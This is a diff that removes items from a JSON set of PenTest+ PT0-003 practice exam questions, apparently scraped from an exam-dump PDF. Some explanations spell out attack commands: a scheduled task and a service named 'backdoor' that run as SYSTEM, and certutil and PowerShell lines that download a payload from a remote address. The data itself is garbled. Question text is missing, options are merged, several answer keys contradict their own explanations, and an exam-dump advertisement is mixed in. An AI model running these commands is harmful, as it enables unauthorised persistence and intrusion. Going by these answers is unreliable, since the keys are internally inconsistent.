     "category": "2.0"
-  },
-  {
-    "id": "q113-60",
-    "number": 60,
-    "question": "[Question text missing from source PDF extract]",
-    "options": {
-      "A": "schtasks.exe",
-      "B": "rundll.exe",
-      "C": "cmd.exe",
-      "D": "chgusr.exe",
-      "E": "sc.exe F. netsh.exe"
-    },
-    "answer": "A",
-    "explanation": "To reenter the system remotely after the patch for the recently exploited RCE vulnerability has\nbeen deployed, the penetration tester can use schtasks.exe and sc.exe.\nschtasks.exe:\nPurpose: Used to create, delete, and manage scheduled tasks on Windows systems.\nPersistence: By creating a scheduled task, the tester can ensure a script or program runs at a\nspecified time, providing a persistent backdoor.\nExample:\nschtasks /create /tn \"Backdoor\" /tr \"C:\\path\\to\\backdoor.exe\" /sc daily /ru SYSTEM sc.exe:\nPurpose: Service Control Manager command-line tool used to manage Windows services.\nPersistence: By creating or modifying a service to run a malicious executable, the tester can\nmaintain persistent access.\nExample:\nsc create backdoor binPath= \"C:\\path\\to\\backdoor.exe\" start= auto\nOther Utilities:\nrundll.exe: Used to run DLLs as applications, not typically used for persistence.\ncmd.exe: General command prompt, not specifically used for creating persistence mechanisms.\nchgusr.exe: Used to change install mode for Remote Desktop Session Host, not relevant for\npersistence.\nnetsh.exe: Used for network configuration, not typically used for persistence.\nPentest References:\nPost-Exploitation: Establishing persistence is crucial to maintaining access after initial\nexploitation.\nWindows Tools: Understanding how to leverage built-in Windows tools like schtasks.exe and\nsc.exe to create backdoors that persist through reboots and patches.\nBy using schtasks.exe and sc.exe, the penetration tester can set up persistent mechanisms that\nwill allow reentry into the system even after the patch is applied.",
-    "category": "1.0"
-  },
-  {
-    "id": "q113-61",
-    "number": 61,
-    "question": "Which of the following elements of a penetration test report can be used to most effectively prioritize the remediation efforts for all the findings?",
-    "options": {
-      "A": "Methodology",
-      "B": "Detailed findings list",
-      "C": "Risk score",
-      "D": "Executive summary"
-    },
-    "answer": "C",
-    "explanation": "Risk scores quantify the severity and likelihood of exploitation for each finding. This helps\norganizations prioritize which vulnerabilities to remediate first based on potential impact and\nexploitability.\nMethodology outlines how the test was performed.\nFindings list shows issues, but without prioritization.\nExecutive summary provides a high-level overview for decision-makers, not technical\nprioritization.\nReference: PT0-003 Objective 5.2 - Reporting components including risk ratings and\nprioritization.\nValid PT0-003 Dumps shared by ExamDiscuss.com for Helping Passing PT0-003 Exam!\nExamDiscuss.com now offer the newest PT0-003 exam dumps , the ExamDiscuss.com\nPT0-003 exam questions have been updated and answers have been corrected get the\nnewest ExamDiscuss.com PT0-003 dumps with Test Engine here:\nhttps://www.examdiscuss.com/CompTIA/exam/PT0-003/premium/ ( 274 Q&As Dumps,\n35%OFF Special Discount Code: freecram )",
-    "category": "3.0"
   },
   {
     "id": "q113-62",
@@ -2302,20 +1769,6 @@
     "category": "2.0"
   },
   {
-    "id": "q113-68",
-    "number": 68,
-    "question": "A penetration tester is developing the rules of engagement for a potential client. Which of the following would most likely be a function of the rules of engagement?",
-    "options": {
-      "A": "Testing window",
-      "B": "Terms of service",
-      "C": "Authorization letter",
-      "D": "Shared responsibilities"
-    },
-    "answer": "A",
-    "explanation": "The rules of engagement define the scope, limitations, and conditions under which a penetration\ntest is conducted. Here's why option A is correct:\n* Testing Window: This specifies the time frame during which the penetration testing activities are\nauthorized to occur. It is a crucial part of the rules of engagement to ensure the testing does not\ndisrupt business operations and is conducted within agreed-upon hours.\n* Terms of Service: This generally refers to the legal agreement between a service provider and\nuser, not specific to penetration testing engagements.\n* Authorization Letter: This provides formal permission for the penetration tester to perform the\nassessment but is not a component of the rules of engagement.\n* Shared Responsibilities: This refers to the division of security responsibilities between parties,\noften seen in cloud service agreements, but not specifically a function of the rules of engagement.\nReferences from Pentest:\n* Luke HTB: Highlights the importance of clearly defining the testing window in the rules of\nengagement to ensure all parties are aligned.\n* Forge HTB: Demonstrates the significance of having a well-defined testing window to avoid\ndisruptions and ensure compliance during the assessment.",
-    "category": "1.0"
-  },
-  {
     "id": "q113-69",
     "number": 69,
     "question": "A penetration tester wants to send a specific network packet with custom flags and sequence numbers to a vulnerable target. Which of the following should the tester use?",
@@ -2328,48 +1781,6 @@
     "answer": "C",
     "explanation": "Scapy is a powerful interactive Python-based packet manipulation tool used by penetration\ntesters to create, modify, send, and analyze custom packets. It supports many protocols and\nallows you to set TCP flags, sequence numbers, and more.\ntcprelay is used to redirect TCP traffic, not to craft packets.\nBluecrack is used for cracking Bluetooth encryption, irrelevant in this context.\ntcpdump is a packet capture tool, not suitable for crafting or injecting packets.\nReference: PT0-003 Objective 3.4 - Tools for manipulating traffic, including Scapy for custom\npacket creation.",
     "category": "3.0"
-  },
-  {
-    "id": "q113-70",
-    "number": 70,
-    "question": "[Question text missing from source PDF extract]",
-    "options": {
-      "A": "SeImpersonatePrivilege",
-      "B": "SeCreateGlobalPrivilege",
-      "C": "SeChangeNotifyPrivilege",
-      "D": "SeManageVolumePrivilege"
-    },
-    "answer": "A",
-    "explanation": "The SeImpersonatePrivilege allows a process to impersonate another user's security context,\nwhich is commonly used in token manipulation attacks for privilege escalation.\n* Option A (SeImpersonatePrivilege) #: Correct.\n* Used in Juicy Potato or Rogue Potato attacks to escalate privileges.\n* Option B (SeCreateGlobalPrivilege) #: Allows creating global objects, but not privilege\nescalation.\n* Option C (SeChangeNotifyPrivilege) #: Enables traverse directory access, not privilege\nescalation.\n* Option D (SeManageVolumePrivilege) #: Used for disk management, not privilege escalation.\n# Reference: CompTIA PenTest+ PT0-003 Official Guide - Windows Privilege Escalation via\nToken Impersonation",
-    "category": "1.0"
-  },
-  {
-    "id": "q113-71",
-    "number": 71,
-    "question": "A penetration tester attempts unauthorized entry to the company's server room as part of a security assessment. Which of the following is the best technique to manipulate the lock pins and open the door without the original key?",
-    "options": {
-      "A": "Plug spinner",
-      "B": "Bypassing",
-      "C": "Decoding",
-      "D": "Raking"
-    },
-    "answer": "D",
-    "explanation": "Lock picking techniques are used in physical security assessments to test access control\nmechanisms.\nRaking (Option D):\nRaking is a lock-picking technique where a rake pick is inserted and rapidly moved in and out to\nmanipulate multiple pins simultaneously.\nIt is faster but less precise than single-pin picking.\nUsed when speed is prioritized over precision.\nReference: CompTIA PenTest+ PT0-003 Official Study Guide - \"Physical Security Testing\nMethods\" Incorrect options:\nOption A (Plug spinner): Used after a lock is picked to rotate the plug in the correct direction.\nOption B (Bypassing): Uses methods like shimming or card sliding, which do not manipulate pins.\nOption C (Decoding): Involves reading lock components (e.g., key cuts) to generate a working\nkey rather than picking.",
-    "category": "2.0"
-  },
-  {
-    "id": "q113-72",
-    "number": 72,
-    "question": "A penetration tester identifies the URL for an internal administration application while following DevOps team members on their commutes. Which of the following attacks did the penetration tester most likely use?",
-    "options": {
-      "A": "Shoulder surfing",
-      "B": "Dumpster diving",
-      "C": "Spear phishing",
-      "D": "Tailgating"
-    },
-    "answer": "A",
-    "explanation": "La tecnica utilizada en este escenario es Shoulder Surfing, que consiste en observar\ndirectamente a una persona mientras trabaja, con el objetivo de recopilar informacion sensible,\ncomo credenciales, direcciones URL internas u otros datos confidenciales.\nEn este caso, el pentester siguio a los miembros del equipo DevOps durante sus\ndesplazamientos (commute) y logro identificar una URL interna. No se uso ingenieria social\ndirecta (como en spear phishing), ni acceso fisico no autorizado (como en tailgating), ni revision\nde basura (dumpster diving).\nReferencia: PT0-003 Objective 2.1 - Explain the importance of physical security assessments.\nShoulder surfing is listed as a key social engineering technique.",
-    "category": "2.0"
   },
   {
     "id": "q113-73",
@@ -2386,20 +1797,6 @@
     "category": "2.0"
   },
   {
-    "id": "q113-75",
-    "number": 75,
-    "question": "With one day left to complete the testing phase of an engagement, a penetration tester obtains the following results from an Nmap scan: Not shown: 1670 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.2.3 (CentOS) 3306/tcp open mysql MySQL (unauthorized) 8888/tcp open http lighttpd 1.4.32 Which of the following tools should the tester use to quickly identify a potential attack path?",
-    "options": {
-      "A": "msfvenom",
-      "B": "SearchSploit",
-      "C": "sqlmap",
-      "D": "BeEF"
-    },
-    "answer": "B",
-    "explanation": "* SearchSploit is a command-line interface for Exploit-DB that allows testers to quickly search for\nknown exploits based on software name and version.\n* With Apache 2.2.3, lighttpd 1.4.32, and MySQL, the tester can plug these into SearchSploit to\nidentify vulnerabilities, matching the goal of finding quick attack paths with limited time.\nOther tools:\n* msfvenom: Payload generator, not a search tool.\n* sqlmap: SQLi exploitation tool, useful for web apps with SQLi, but requires validation of such a\nvuln first.\n* BeEF: Browser exploitation framework, not relevant here.\nCompTIA PenTest+ Reference:\n* PT0-003 Objective 2.2 & 2.5: Exploit and identify attack paths.\n* SearchSploit and Exploit-DB usage are recommended tools in CompTIA's resources.",
-    "category": "1.0"
-  },
-  {
     "id": "q113-76",
     "number": 76,
     "question": "A penetration tester completes a scan and sees the following Nmap output on a host: Nmap scan report for victim (10.10.10.10) Host is up (0.0001s latency) PORT STATE SERVICE 161/udp open snmp 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server Running Microsoft Windows 7 OS CPE: cpe:/o:microsoft:windows_7::sp0 The tester wants to obtain shell access. Which of the following related exploits should the tester try first?",
@@ -2414,34 +1811,6 @@
     "category": "2.0"
   },
   {
-    "id": "q113-77",
-    "number": 77,
-    "question": "A penetration tester is attempting to discover vulnerabilities in a company's web application. Which of the following tools would most likely assist with testing the security of the web application?",
-    "options": {
-      "A": "OpenVAS",
-      "B": "Nessus",
-      "C": "sqlmap",
-      "D": "Nikto"
-    },
-    "answer": "D",
-    "explanation": "When testing the security of a web application, specific tools are designed to uncover\nvulnerabilities and issues. Here's an overview of the tools mentioned and why Nikto is the most\nsuitable for this task:\nNikto:\nPurpose: Nikto is a web server scanner that performs comprehensive tests against web servers\nfor multiple items, including potentially dangerous files/programs, outdated versions, and other\nsecurity issues.\nRelevance: It is designed specifically for discovering vulnerabilities in web applications, making it\nthe most appropriate choice for a penetration tester targeting a web application.\nComparison with Other Tools:\nOpenVAS: A general-purpose vulnerability scanner that targets a wide range of network services\nand hosts, not specifically tailored for web applications.\nNessus: Similar to OpenVAS, Nessus is a comprehensive vulnerability scanner but is broader in\nscope and not focused solely on web applications.\nsqlmap: This tool is excellent for SQL injection testing but is limited to database vulnerabilities\nand doesn't cover the full spectrum of web application security issues.",
-    "category": "2.0"
-  },
-  {
-    "id": "q113-78",
-    "number": 78,
-    "question": "During host discovery, a security analyst wants to obtain GeoIP information and a comprehensive summary of exposed services. Which of the following tools is best for this task?",
-    "options": {
-      "A": "WiGLE.net",
-      "B": "WHOIS",
-      "C": "theHarvester",
-      "D": "Censys.io"
-    },
-    "answer": "D",
-    "explanation": "Censys.io is a powerful reconnaissance tool that scans the internet and provides detailed\ninformation about exposed services, certificates, and GeoIP data.\n* Option A (WiGLE.net) #: Used for wireless network mapping, not host discovery.\n* Option B (WHOIS) #: Provides domain registration information, not GeoIP or service\nsummaries.\n* Option C (theHarvester) #: Used for OSINT, mainly to collect emails, subdomains, and\nusernames.\n* Option D (Censys.io) #: Correct. Censys provides:\n* GeoIP data (location of hosts).\n* Exposed services and open ports.\n* TLS certificate analysis.\n# Reference: CompTIA PenTest+ PT0-003 Official Guide - Reconnaissance and OSINT Tools",
-    "category": "1.0"
-  },
-  {
     "id": "q113-79",
     "number": 79,
     "question": "A penetration tester gains access to a domain server and wants to enumerate the systems within the domain. Which of the following tools would provide the best oversight of domains?",
@@ -2454,20 +1823,6 @@
     "answer": "C",
     "explanation": "* Installation:\n* Nmap can be installed on various operating systems. For example, on a Debian-based system:\nsudo apt-get install nmap\n* Basic Network Scanning:\n* To scan a range of IP addresses in the network:\nnmap -sP 192.168.1.0/24\n* Service and Version Detection:\n* To scan for open ports and detect the service versions running on a specific host:\nnmap -sV 192.168.1.10\n* Enumerating Domain Systems:\n* Use Nmap with additional scripts to enumerate domain systems. For example, using the --script\noption:\nnmap -p 445 --script=smb-enum-domains 192.168.1.10\n* Advanced Scanning Options:\n* Stealth Scan: Use the -sS option to perform a stealth scan:\nnmap -sS 192.168.1.10\n* Aggressive Scan: Use the -A option to enable OS detection, version detection, script scanning,\nand traceroute:\nnmap -A 192.168.1.10\n* Real-World Example:\n* A penetration tester uses Nmap to enumerate the systems within a domain by scanning the\nnetwork for live hosts and identifying the services running on each host. This information helps in\nidentifying potential vulnerabilities and entry points for further exploitation.\n* References from Pentesting Literature:\n* In \"Penetration Testing - A Hands-on Introduction to Hacking,\" Nmap is extensively discussed\nfor various stages of the penetration testing process, from reconnaissance to vulnerability\nassessment.\n* HTB write-ups often illustrate the use of Nmap for network enumeration and discovering\npotential attack vectors.\nReferences:\n* Penetration Testing - A Hands-on Introduction to Hacking\n* HTB Official Writeups",
     "category": "2.0"
-  },
-  {
-    "id": "q113-80",
-    "number": 80,
-    "question": "[Question text missing from source PDF extract]",
-    "options": {
-      "A": "Obtain long-term, valid access to the facility",
-      "B": "Disrupt the availability of facility access systems",
-      "C": "Change access to the facility for valid users",
-      "D": "Revoke access to the facility for valid users"
-    },
-    "answer": "A",
-    "explanation": "The unauthorized reprinting of ID badges suggests the penetration tester is attempting physical\nsecurity penetration testing to gain long-term access.\n* Option A (Obtain long-term, valid access) #: Correct. Cloning or reprinting badges allows\npersistent access past security checks.\n* Option B (Disrupt availability) #: There is no indication of a denial-of-service attack.\n* Option C (Change access for valid users) #: The goal is not modifying user access, but rather\ngaining unauthorized access.\n* Option D (Revoke access for valid users) #: The logs show new badges being printed, not\nrevocation.\n# Reference: CompTIA PenTest+ PT0-003 Official Guide - Physical Security Testing",
-    "category": "1.0"
   },
   {
     "id": "q113-81",
@@ -2554,20 +1909,6 @@
     "category": "1.0"
   },
   {
-    "id": "q113-87",
-    "number": 87,
-    "question": "A penetration tester gains initial access to an endpoint and needs to execute a payload to obtain additional access. Which of the following commands should the penetration tester use?",
-    "options": {
-      "A": "powershell.exe impo C:\\tools\\foo.ps1",
-      "B": "certutil.exe -f https://192.168.0.1/foo.exe bad.exe",
-      "C": "powershell.exe -noni -encode IEX.Downloadstring(\"http://172.16.0.1/\")",
-      "D": "rundll32.exe c:\\path\\foo.dll,functName"
-    },
-    "answer": "B",
-    "explanation": "To execute a payload and gain additional access, the penetration tester should use certutil.exe.\nHere's why:\n* Using certutil.exe:\n* Purpose: certutil.exe is a built-in Windows utility that can be used to download files from a\nremote server, making it useful for fetching and executing payloads.\n* Command: certutil.exe -f https://192.168.0.1/foo.exe bad.exe downloads the file foo.exe from\nthe specified URL and saves it as bad.exe.\n* Comparison with Other Commands:\n* powershell.exe impo C:\\tools\\foo.ps1 (A): Incorrect syntax and not as direct as using certutil for\ndownloading files.\n* powershell.exe -noni -encode IEX.Downloadstring(\"http://172.16.0.1/\") (C): Incorrect syntax for\ndownloading and executing a script.\n* rundll32.exe c:\\path\\foo.dll,functName (D): Used for executing DLLs, not suitable for\ndownloading a payload.\nUsing certutil.exe to download and execute a payload is a common and effective method.",
-    "category": "1.0"
-  },
-  {
     "id": "q113-88",
     "number": 88,
     "question": "A tester performs a vulnerability scan and identifies several outdated libraries used within the customer SaaS product offering. Which of the following types of scans did the tester use to identify the libraries?",
@@ -2580,20 +1921,6 @@
     "answer": "B",
     "explanation": "kube-hunter is a tool designed to perform security assessments on Kubernetes clusters. It\nidentifies various vulnerabilities, focusing on weaknesses and misconfigurations. Here's why\noption B is correct:\n* Kube-hunter: It scans Kubernetes clusters to identify security issues, such as misconfigurations,\ninsecure settings, and potential attack vectors.\n* Network Configuration Errors: While kube-hunter might identify some network-related issues, its\nprimary focus is on Kubernetes-specific vulnerabilities and misconfigurations.\n* Application Deployment Issues: These are more related to the applications running within the\ncluster, not the cluster configuration itself.\n* Security Vulnerabilities in Docker Containers: Kube-hunter focuses on the Kubernetes\nenvironment rather than Docker container-specific vulnerabilities.\nReferences from Pentest:\n* Forge HTB: Highlights the use of specialized tools to identify misconfigurations in environments,\nsimilar to how kube-hunter operates within Kubernetes clusters.\n* Anubis HTB: Demonstrates the importance of identifying and fixing misconfigurations within\ncomplex environments like Kubernetes clusters.\nConclusion:\nOption B, weaknesses and misconfigurations in the Kubernetes cluster, accurately describes the\ntype of vulnerabilities that kube-hunter is designed to detect.",
     "category": "2.0"
-  },
-  {
-    "id": "q113-90",
-    "number": 90,
-    "question": "[Question text missing from source PDF extract]",
-    "options": {
-      "A": "Burp Suite",
-      "B": "Netcat",
-      "C": "Responder",
-      "D": "Nmap"
-    },
-    "answer": "C",
-    "explanation": "Responderes una herramienta especializada para capturar traficoLLMNR, NBNS y MDNS, y\nrealizar ataques de spoofing y captura de hashes. Es ampliamente utilizada en entornos\nWindows para capturar credenciales cuando se resuelven nombres que no existen en el DNS.\nNetcat y Burp Suite no estan disenados para este proposito. Nmap sirve para escaneo de redes,\npero no para captura ni explotacion de LLMNR.\nReferencia:PT0-003 Objective 4.2 - Explain lateral movement techniques and privilege escalation\ntools (Responder is explicitly listed).",
-    "category": "3.0"
   },
   {
     "id": "q113-91",
@@ -2621,20 +1948,6 @@
     },
     "answer": "B",
     "explanation": "To perform credentialed scans on an Active Directory (AD) server, the scanner requires high-level\naccess to retrieve system configuration, patch levels, and user rights. A Domain Administrator\naccount ensures full visibility into domain resources and permissions, which is essential for a\ncomplete vulnerability assessment.\nFrom the CompTIA PenTest+ PT0-003 Objectives - Domain 2.0: Information Gathering and\nVulnerability Identification:\n\"Credentialed scans require administrative-level access on target systems to provide detailed\ninsights into software versions, missing patches, and security settings.\" Reference: CompTIA\nPenTest+ PT0-003 Official Study Guide, Chapter 6",
-    "category": "1.0"
-  },
-  {
-    "id": "q113-93",
-    "number": 93,
-    "question": "A penetration tester gains access to a Windows machine and wants to further enumerate users with native operating system credentials. Which of the following should the tester use?",
-    "options": {
-      "A": "route",
-      "B": "nbtstat",
-      "C": "net",
-      "D": "whoami"
-    },
-    "answer": "C",
-    "explanation": "Windows provides built-in utilities for user enumeration and privilege escalation.\nnet command (Option C):\nThe net command is used to list users, groups, and shares on a Windows system:\nnet user\nnet localgroup administrators\nnet group \"Domain Admins\" /domain\nUseful for gathering privilege escalation targets and understanding user permissions.\nReference: CompTIA PenTest+ PT0-003 Official Study Guide - \"Windows Enumeration\nCommands\" Incorrect options:\nOption A (route): Displays network routing tables, not user information.\nOption B (nbtstat): Used for NetBIOS name resolution, but does not enumerate users.\nOption D (whoami): Displays current logged-in user but does not list all users.",
     "category": "1.0"
   },
   {
@@ -2722,48 +2035,6 @@
     "category": "2.0"
   },
   {
-    "id": "q113-100",
-    "number": 100,
-    "question": "[Question text missing from source PDF extract]",
-    "options": {
-      "A": "To enumerate current users",
-      "B": "To determine the users' permissions",
-      "C": "To view scheduled processes",
-      "D": "To create persistence in the network"
-    },
-    "answer": "D",
-    "explanation": "The logs indicate that the penetration testing team's objective was to create persistence in the\nnetwork.\nLog Analysis:\nschtasks /query: This command lists all the scheduled tasks on the system. It is often used to\nunderstand what tasks are currently scheduled and running.\nschtasks /CREATE /SC DAILY: This command creates a new scheduled task that runs daily.\nCreating such a task can be used to ensure that a script or program runs regularly, maintaining a\nfoothold in the system.\nPersistence:\nDefinition: Persistence refers to techniques used to maintain access to a compromised system\neven after reboots or other interruptions.\nScheduled Tasks: One common method of achieving persistence on Windows systems is by\ncreating scheduled tasks that execute malicious payloads or scripts at regular intervals.\nOther Options:\nEnumerate Current Users: The logs do not show commands related to user enumeration.\nDetermine Users' Permissions: Commands like whoami or net user would be more relevant for\nchecking user permissions.\nView Scheduled Processes: While schtasks /query can view scheduled tasks, the addition of the\nschtasks\n/CREATE command indicates the intent to create new scheduled tasks, which aligns with creating\npersistence.\nPentest References:\nPost-Exploitation: Establishing persistence is a key objective after gaining initial access to ensure\ncontinued access.\nScheduled Tasks: Utilizing Windows Task Scheduler to run scripts or programs automatically at\nspecified times as a method for maintaining access.\nBy creating scheduled tasks, the penetration testing team aims to establish persistence, ensuring\nthey can retain access to the system over time.",
-    "category": "1.0"
-  },
-  {
-    "id": "q113-101",
-    "number": 101,
-    "question": "A penetration tester is conducting reconnaissance on a target network. The tester runs the following Nmap command: nmap -sv -sT -p - 192.168.1.0/24. Which of the following describes the most likely purpose of this scan?",
-    "options": {
-      "A": "OS fingerprinting",
-      "B": "Attack path mapping",
-      "C": "Service discovery",
-      "D": "User enumeration"
-    },
-    "answer": "C",
-    "explanation": "The Nmap command nmap -sv -sT -p- 192.168.1.0/24 is designed to discover services on a\nnetwork. Here is a breakdown of the command and its purpose:\nCommand Breakdown:\nnmap: The network scanning tool.\n-sV: Enables service version detection. This option tells Nmap to determine the version of the\nservices running on open ports.\n-sT: Performs a TCP connect scan. This is a more reliable method of scanning as it completes\nthe TCP handshake but can be easily detected by firewalls and intrusion detection systems.\n-p-: Scans all 65535 ports. This ensures a comprehensive scan of all possible TCP ports.\n192.168.1.0/24: Specifies the target network range (subnet) to be scanned.\nPurpose of the Scan:\nService Discovery (Answer: C): The primary purpose of this scan is to discover which services\nare running on the network's hosts and determine their versions. This information is crucial for\nidentifying potential vulnerabilities and understanding the network's exposure.\nReferences:\nService discovery is a common task in penetration testing to map out the network services and\nversions, as seen in various Hack The Box (HTB) write-ups where comprehensive service\nenumeration is performed before further actions.\nConclusion: The nmap -sv -sT -p- 192.168.1.0/24 command is most likely used for service\ndiscovery, as it aims to identify all running services and their versions on the target subnet.",
-    "category": "1.0"
-  },
-  {
-    "id": "q113-102",
-    "number": 102,
-    "question": "A penetration tester wants to check the security awareness of specific workers in the company with targeted attacks. Which of the following attacks should the penetration tester perform?",
-    "options": {
-      "A": "Phishing",
-      "B": "Tailgating",
-      "C": "Whaling",
-      "D": "Spear phishing"
-    },
-    "answer": "D",
-    "explanation": "Spear phishing is a targeted email attack aimed at specific individuals within an organization.\nUnlike general phishing, spear phishing is personalized and often involves extensive\nreconnaissance to increase the likelihood of success.\n* Understanding Spear Phishing:\n* Targeted Attack: Focuses on specific individuals or groups within an organization.\n* Customization: Emails are customized based on the recipient's role, interests, or recent\nactivities.\n* Purpose:\n* Testing Security Awareness: Evaluates how well individuals recognize and respond to phishing\nattempts.\n* Information Gathering: Attempts to collect sensitive information such as credentials, financial\ndata, or personal details.\n* Process:\n* Reconnaissance: Gather information about the target through social media, public records, and\nother sources.\n* Email Crafting: Create a convincing email that appears to come from a trusted source.\n* Delivery and Monitoring: Send the email and monitor for responses or actions taken by the\nrecipient.\n* References from Pentesting Literature:\n* Spear phishing is highlighted in penetration testing methodologies for testing security\nawareness and the effectiveness of email filtering systems.\n* HTB write-ups and phishing simulation exercises often detail the use of spear phishing to\nassess organizational security.\nStep-by-Step ExplanationReferences:\n* Penetration Testing - A Hands-on Introduction to Hacking\n* HTB Official Writeups",
-    "category": "1.0"
-  },
-  {
     "id": "q113-103",
     "number": 103,
     "question": "A penetration testing team needs to determine whether it is possible to disrupt wireless communications for PCs deployed in the client's offices. Which of the following techniques should the penetration tester leverage?",
@@ -2776,20 +2047,6 @@
     "answer": "A",
     "explanation": "To assess wireless communication disruptions, channel scanning is used to identify active Wi-Fi\nchannels, allowing testers to target specific frequencies for jamming or deauthentication attacks.\n* Option A (Port mirroring) #: Used for network traffic monitoring, not wireless disruption.\n* Option B (Sidecar scanning) #: Not a commonly used technique in wireless testing.\n* Option C (ARP poisoning) #: Used to manipulate ARP tables on wired networks, not for wireless\ninterference.\n* Option D (Channel scanning) #: Correct.\n* Identifies which Wi-Fi channels are in use.\n* Helps perform jamming, deauthentication, or interference attacks.\n# Reference: CompTIA PenTest+ PT0-003 Official Guide - Wireless Attacks and Security Testing",
     "category": "2.0"
-  },
-  {
-    "id": "q113-104",
-    "number": 104,
-    "question": "A penetration tester is conducting an assessment of a web application's login page. The tester needs to determine whether there are any hidden form fields of interest. Which of the following is the most effective technique?",
-    "options": {
-      "A": "XSS",
-      "B": "On-path attack",
-      "C": "SQL injection",
-      "D": "HTML scraping"
-    },
-    "answer": "D",
-    "explanation": "Hidden form fields in web applications can store user roles, session tokens, and security\nparameters that attackers may exploit.\nHTML scraping (Option D):\nInvolves analyzing HTML source code to find hidden fields like:\n<input type=\"hidden\" name=\"admin_access\" value=\"true\">\nAttackers use tools like Burp Suite, ZAP, or browser developer tools (Ctrl+U or Inspect Element)\nto locate hidden fields.\nReference: CompTIA PenTest+ PT0-003 Official Study Guide - \"Web Application Testing and\nForm Field Analysis\" Incorrect options:\nOption A (XSS): Exploits JavaScript injection, not for finding hidden fields.\nOption B (On-path attack): Involves MITM interception, not directly analyzing form fields.\nOption C (SQL injection): Targets databases, not HTML forms",
-    "category": "1.0"
   },
   {
     "id": "q113-105",
@@ -2860,20 +2117,6 @@
     },
     "answer": "A",
     "explanation": "* Watering Hole Attack Explanation:\n* A watering hole attack involves compromising a website that the target frequently visits.\n* The attacker injects malicious code into the site, which then exploits users who access it.\n* Why Not Other Options?\n* B: DDoS attacks disrupt services but do not align with the watering hole strategy.\n* C: Social engineering may be effective but is not a watering hole attack.\n* D: Phishing is unrelated to compromising trusted websites.\nCompTIA Pentest+ References:\n* Domain 3.0 (Attacks and Exploits)",
-    "category": "1.0"
-  },
-  {
-    "id": "q113-110",
-    "number": 110,
-    "question": "[Question text missing from source PDF extract]",
-    "options": {
-      "A": "theHarvester",
-      "B": "Shodan",
-      "C": "Amass",
-      "D": "Nmap"
-    },
-    "answer": "A",
-    "explanation": "Shodan is a search engine that specializes in finding internet-connected devices, including ICS,\nIoT, webcams, routers, and servers. Attackers and security professionals use Shodan to scan for\npublicly accessible systems that may be vulnerable.\n* Option A (theHarvester) #: theHarvester is primarily used for OSINT (Open-Source Intelligence)\ngathering, such as email addresses, subdomains, and hostnames, but it does not specialize in\nICS/IoT discovery.\n* Option B (Shodan) #: Correct. Shodan scans the internet for connected devices and services,\nallowing penetration testers to find ICS/IoT systems that are exposed.\n* Option C (Amass) #: Amass is used for subdomain enumeration and DNS reconnaissance, not\nfor ICS or IoT discovery.\n* Option D (Nmap) #: Nmap is a port scanner that can identify live hosts and open ports, but it\ndoes not search for publicly available systems on a large scale like Shodan.\n# Reference: CompTIA PenTest+ PT0-003 Official Guide - OSINT and Reconnaissance",
     "category": "1.0"
   },
   {
